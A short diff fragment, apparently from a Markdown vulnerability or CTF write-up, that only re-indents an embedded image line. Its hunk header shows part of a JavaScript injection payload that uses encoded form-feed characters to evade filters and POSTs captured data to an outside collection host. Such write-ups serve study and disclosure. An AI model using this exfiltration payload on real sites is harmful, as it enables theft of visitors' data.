@@ -60,7 +60,7 @@ then(data%0C=>%0Cfetch("https://qlashx.free.beeceptor.com/",%0C{method:"POST",%0
   ```
 
 
-    ![image](https://github.com/user-attachments/assets/943c34c6-11f1-4835-81dd-e08e9c665855)
+  ![image](https://github.com/user-attachments/assets/943c34c6-11f1-4835-81dd-e08e9c665855)
 
 
 
